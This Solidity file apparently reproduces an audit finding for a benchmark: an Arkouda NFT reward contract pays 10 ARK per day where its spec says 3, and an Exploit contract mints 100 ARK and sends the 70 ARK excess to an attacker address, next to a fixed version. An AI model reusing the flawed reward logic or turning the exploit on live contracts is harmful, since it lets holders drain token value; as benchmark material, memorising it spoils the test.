// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

/*
 * AuditVault 56421 — CWBC Arkouda.BASE_REWARD (Zokyo, 2022-02).
 *
 * BASE_REWARD is 10 ARK. The stated minimum tier is 3 ARK/day.
 * claimReward pays daysHeld * BASE_REWARD, so 10 days of holding mints 100 ARK
 * instead of 30. The extra 70 ARK is the harm. Rewards have been started, so
 * this is the constant, not the pre-start claim.
 *
 * Acquisition time is stored as 1. Block timestamp is 1 + 10 days for the
 * whole transaction. No warp inside run().
 */

contract Arkouda {
    uint256 public constant BASE_REWARD = 10 ether;
    uint256 public constant SPEC_PER_DAY = 3 ether;

    uint256 public rewardGenerationStartTime;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public acquiredAt;

    uint256 public lastDays;
    uint256 public lastReward;
    uint256 public specReward;

    constructor() {
        rewardGenerationStartTime = 1;
    }

    function mintNft(address to, uint256 id, uint256 whenAcquired) external {
        require(ownerOf[id] == address(0), "exists");
        ownerOf[id] = to;
        acquiredAt[id] = whenAcquired;
    }

    function claimReward(uint256 tokenId) external {
        require(ownerOf[tokenId] == msg.sender, "holder");
        require(rewardGenerationStartTime != 0, "not started");
        require(block.timestamp >= rewardGenerationStartTime, "before start");
        uint256 daysHeld = (block.timestamp - acquiredAt[tokenId]) / 1 days;
        lastDays = daysHeld;
        specReward = daysHeld * SPEC_PER_DAY;
        // @> VULN:
        lastReward = daysHeld * BASE_REWARD;
        balanceOf[msg.sender] += lastReward;
        totalSupply += lastReward;
        acquiredAt[tokenId] = block.timestamp;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ArkoudaFixed {
    uint256 public constant BASE_REWARD = 3 ether;
    uint256 public rewardGenerationStartTime = 1;
    mapping(address => uint256) public balanceOf;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public acquiredAt;

    function mintNft(address to, uint256 id, uint256 whenAcquired) external {
        ownerOf[id] = to;
        acquiredAt[id] = whenAcquired;
    }

    function claimReward(uint256 tokenId) external {
        require(ownerOf[tokenId] == msg.sender, "holder");
        uint256 daysHeld = (block.timestamp - acquiredAt[tokenId]) / 1 days;
        uint256 reward = daysHeld * BASE_REWARD;
        balanceOf[msg.sender] += reward;
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant PURCHASED_AT = 1;

    Arkouda public arkouda;
    uint256 public minted;
    uint256 public spec;
    uint256 public excess;

    function run() external {
        require(block.timestamp >= PURCHASED_AT + 10 days, "one block at day 10");
        arkouda = new Arkouda();
        arkouda.mintNft(address(this), 1, PURCHASED_AT);
        arkouda.claimReward(1);
        minted = arkouda.lastReward();
        spec = arkouda.specReward();
        excess = minted - spec;
        require(arkouda.lastDays() == 10, "days");
        require(minted == 100 ether, "minted");
        require(spec == 30 ether, "spec");
        require(excess == 70 ether, "excess");
        arkouda.transfer(ATTACKER, excess);
    }
}
